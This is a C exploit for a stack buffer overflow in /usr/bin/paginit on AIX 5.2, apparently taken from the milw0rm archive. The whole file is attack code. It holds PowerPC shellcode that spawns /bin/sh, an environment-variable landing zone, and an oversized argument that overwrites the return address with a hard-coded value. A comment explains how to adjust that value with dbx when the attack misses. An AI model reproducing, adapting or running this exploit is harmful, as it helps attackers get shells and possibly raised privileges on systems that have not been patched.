/* exploit for /usr/bin/paginit
   tested on: AIX 5.2

   if the exploit fails it's because the shellcode
   ends up at a different address. use dbx to check,
   and change RETADDR accordingly.

   cees-bart <ceesb cs ru nl>
*/

#define RETADDR 0x2ff22c90

char shellcode[] =
"\x7c\xa5\x2a\x79"
"\x40\x82\xff\xfd"
"\x7c\xa8\x02\xa6"
"\x38\xe0\x11\x11"
"\x39\x20\x48\x11"
"\x7c\xc7\x48\x10"
"\x38\x46\xc9\x05"
"\x39\x25\x11\x11"
"\x38\x69\xef\x17"
"\x38\x87\xee\xef"
"\x7c\xc9\x03\xa6"
"\x4e\x80\x04\x20"
"\x2f\x62\x69\x6e"
"\x2f\x73\x68\x00"
;

char envlabel[] = "X=";

void printint(char* buf, int x) {
  buf[0] = x >> 24;
  buf[1] = (x >> 16) & 0xff;
  buf[2] = (x >> 8) & 0xff;
  buf[3] = x & 0xff;
}

int main(int argc, char **argv) {
  char *env[3];
  char code[1000];
  char buf[8000];
  char *p, *i;
  int offset1 = 0;

  offset1 = 0; // atoi(argv[1]);

  memset(code, 'C', sizeof(code));
  memcpy(code, envlabel,sizeof(envlabel)-1);
  // landingzone
  for(i=code+sizeof(envlabel)+offset1; i<code+sizeof(code); i+=4)
    printint(i, 0x7ca52a79);

  memcpy(code+sizeof(code)-sizeof(shellcode), shellcode, sizeof(shellcode)-1);
  code[sizeof(code)-1] = 0;

  env[0] = code;
  env[1] = 0;

  memset(buf, 'A', sizeof(buf));
  buf[sizeof(buf)-1] = 0;

  p = buf;
  p += 4114;
  printint(p,RETADDR); // try to hit the landingzone
  p += 72;
  printint(p, RETADDR); // any readable address (apparently not overwritten)

  execle("/usr/bin/paginit", "/usr/bin/paginit", buf, 0, env);
}

// milw0rm.com [2004-12-20]